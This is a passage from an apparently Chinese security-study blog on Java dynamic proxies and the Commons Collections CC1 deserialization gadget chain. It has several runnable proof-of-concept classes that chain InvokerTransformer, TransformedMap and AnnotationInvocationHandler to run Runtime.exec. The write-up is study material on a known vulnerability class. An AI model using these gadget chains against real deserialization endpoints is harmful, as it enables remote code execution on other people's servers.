class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.map, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ORIObjectfindName</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;white class: &quot;</span>+ object.hashCode() +<span class="hljs-string">&quot;, pass!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ObjectfindName</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Object object;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object object)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.object=object;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-keyword">this</span>.getClass().getClassLoader(), <span class="hljs-keyword">this</span>.object.getClass().getInterfaces(),<span class="hljs-keyword">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">for</span>(Object o:args)&#123;<br>            System.out.println(<span class="hljs-string">&quot;black class proxy: &quot;</span>+ o.hashCode() +<span class="hljs-string">&quot;, block!&quot;</span>);<br>            <span class="hljs-keyword">if</span> (o.toString().contains(<span class="hljs-string">&quot;System&quot;</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.object,args);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DynamicProxy</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ORIObjectfindName oriObjectfindName = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        oriObjectfindName.getClassName(String.class);<br><br>        ObjectInterface oriObjectfindName1 = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        ObjectfindName objectfindNameproxy = <span class="hljs-keyword">new</span> ObjectfindName();<br>        ObjectInterface objectInterface =(ObjectInterface) objectfindNameproxy.get(oriObjectfindName1);<br>        objectInterface.getClassName(System.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="动态代理类实例序列化问题"><a href="#动态代理类实例序列化问题" class="headerlink" title="动态代理类实例序列化问题"></a>动态代理类实例序列化问题</h5><p>动态代理类符合<code>Java</code>对象序列化条件，并且在<code>序列化/反序列化</code>时会被<code>ObjectInputStream/ObjectOutputStream</code>特殊处理</p><p>动态代理生成的类在<code>反序列化/反序列化</code>时不会序列化该类的成员变量，并且<code>serialVersionUID</code>为<code>0L</code> ，也将是说将该类的<code>Class</code>对象传递给<code>java.io.ObjectStreamClass</code>的静态<code>lookup</code>方法时，返回的<code>ObjectStreamClass</code>实例将具有以下特性：</p><ol><li>调用其<code>getSerialVersionUID</code>方法将返回<code>0L</code></li><li>调用其<code>getFields</code>方法将返回长度为零的数组</li><li>调用其<code>getField</code>方法将返回<code>null</code></li></ol><p>但其父类(<code>java.lang.reflect.Proxy</code>)在序列化时不受影响，父类中的<code>h</code>变量(<code>InvocationHandler</code>)将会被序列化，这个<code>h</code>存储了动态代理类的处理类实例以及动态代理的接口类的实现类的实例</p><p>动态代理生成的对象(<code>com.sun.proxy.$ProxyXXX</code>)序列化的时候会使用一个特殊的协议：<code>TC_PROXYCLASSDESC(0x7D)</code>，这个常量在<code>java.io.ObjectStreamConstants</code>中定义的。在反序列化时也不会调用<code>java.io.ObjectInputStream</code>类的<code>resolveClass</code>方法而是调用<code>resolveProxyClass</code>方法来转换成类对象的</p><h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="p-牛简化-poc"><a href="#p-牛简化-poc" class="headerlink" title="p 牛简化 poc"></a>p 牛简化 poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap&lt;Object, Object&gt; hm = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br>        decorate.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建一个<code>transformer</code>对象链(Transformer 数组存储)：<strong>ConstantTransformer-&gt;返回当前 Runtime 环境的 Runtime 对象；InvokerTransformer-&gt;利用其重写的 transformer 方法进行反射调用 exec 方法</strong></p><p>触发：通过包装<code>HashMap</code>，使用<code>TransformerMap</code>修饰 Map，通过<code>Map.put</code>的操作触发</p><p><strong>通过 ConstantTransformer、ChainedTransformer 完成 payload 在客户端自定义-&gt;服务端反序列化我们的输入 ChainedTransformer 类型&amp;调用 transform 方法</strong>到这里还不足以形成漏洞，因为显然服务端不存在这种代码</p><p>然而通过<code>TransformerMap</code>进一步地延长利用链：<strong>触发条件从显性的调用转换链的 transform 函数延伸到修改 map 的值，而这是一个常规操作并存在于服务段，因此极有可能被触发</strong></p><p>然而这样添加元素的操作或者修改某个键值已然很常见了，但我们符合反序列化攻击的攻击更直接的是触发一个类的<code>readObject</code>对 Map 的数值进行操作</p><h4 id="①jdk1-7-AnnotationInvocationHandler"><a href="#①jdk1-7-AnnotationInvocationHandler" class="headerlink" title="①jdk1.7 AnnotationInvocationHandler"></a>①jdk1.7 AnnotationInvocationHandler</h4><p>实际环境中<code>Commons Collections</code> + <code>AnnotationInvocationHandler</code> 组件非常经典，在 jdk 1.7 中有一个存在一个可利用的 readObject 点 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>，在 idea 中直接搜索，看到其<code>readObject</code>方法以及构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<br>        Class[] var3 = var1.getInterfaces();<br>        <span class="hljs-keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="hljs-number">1</span> &amp;&amp; var3[<span class="hljs-number">0</span>] == Annotation.class) &#123;<br>            <span class="hljs-keyword">this</span>.type = var1;<br>            <span class="hljs-keyword">this</span>.memberValues = var2;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AnnotationFormatError(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        &#125;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        var1.defaultReadObject();<br>        AnnotationType var2 = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            var2 = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map var3 = var2.memberTypes();<br>        Iterator var4 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            Map.Entry var5 = (Map.Entry)var4.next();<br>            String var6 = (String)var5.getKey();<br>            Class var7 = (Class)var3.get(var6);<br>            <span class="hljs-keyword">if</span> (var7 != <span class="hljs-keyword">null</span>) &#123;<br>                Object var8 = var5.getValue();<br>                <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    var5.setValue((<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>对于<code>readObject</code>，<code>this.memberValues.entrySet().iterator()</code>，构造方法可知这是<code>Map&lt;String, Object&gt;.entrySet().iterator()</code>，从前面的代码来说，这里是经过了<code>TransformedMap</code>修饰后的对象，后面的代码逻辑是遍历元素并依次设置值，而在调用<code>setValue</code>时就和<code>Map.put()</code>方法一样</p><p>此时我们可以尝试编写 poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = TransformedMap.decorate(hm,<span class="hljs-keyword">null</span>,chainedTransformer);<br>        hm.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;b&quot;</span>);<br><br>        <span class="hljs-comment">//反射获取AnnotationInvocationHandler对象</span><br>        Class cl = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);<br>        ctor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object instance = ctor.newInstance(Target.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(instance);<br>        oos.flush();<br>        oos.close();<br><br>        <span class="hljs-comment">//模拟服务端反序列化</span><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>不出意外的话出了意外：<code>Exception in thread &quot;main&quot; java.io.NotSerializableException: java.lang.Runtime</code>，就是我们<code>Transformer</code>数组储存的<code>new ConstantTransformer(Runtime.getRuntime)</code>中，<code>Runtime</code>类 并不支持序列化(没有实现 Serializable 接口)，要解决这个问题，还得通过反射来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Constructor declaredConstructor = clz.getDeclaredConstructor();<br>declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>Object newInstance = declaredConstructor.newInstance();<br>Method execMeth = clz.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>execMeth.invoke(newInstance,<span class="hljs-string">&quot;whoami&quot;</span>);<br><br>或单例模式：<br>Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Method getRuntimeMeth = clz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>Runtime runtime = (Runtime) getRuntimeMeth.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>Method execMeth = clz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>execMeth.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>写进<code>Transformer</code>数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        hm.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(newInstance);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//编写技巧？https://www.bilibili.com/video/BV1no4y1U7E1  32:40</span><br><span class="hljs-comment">//1. 先写出反射 2. 例如InvokerTransformer构造方法得知，第一个参数必定传入methodName；第二个参数是参数列表(Class数组型)，至于数组填入什么，那么就看具体的方法参数类型写进数组；第三个参数是传入的参数值(Object数组型)，这个一定要和第二个参数情形一致，比如Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);这样反射是可以的，但是填入Object数组需要填写完整</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Class clz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="hljs-comment">Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">Runtime runtime = (Runtime) getRuntimeMeth.invoke(null, null);</span><br><span class="hljs-comment">Method execMeth = clz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">execMeth.invoke(runtime, &quot;calc&quot;);</span><br><span class="hljs-comment">*/</span><br><br>            Method getRuntimeMeth = (Method) <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;).transform(Runtime.class);<br>            Runtime r =(Runtime) <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;).transform(getRuntimeMeth);<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br><span class="hljs-comment">//然后利用Transform数组+ChainedTransformer来把这些串起来，注意到我们是从反射的的getMethod开始写的，串起来的链如何调用呢，ChainedTransformer.transform方法是循环调用Transformer数组的，因此传给数组的第一个值即可</span><br><br><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br><br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br><br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(Runtime.class);<br><br><span class="hljs-comment">//        Method getRuntimeMeth = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, 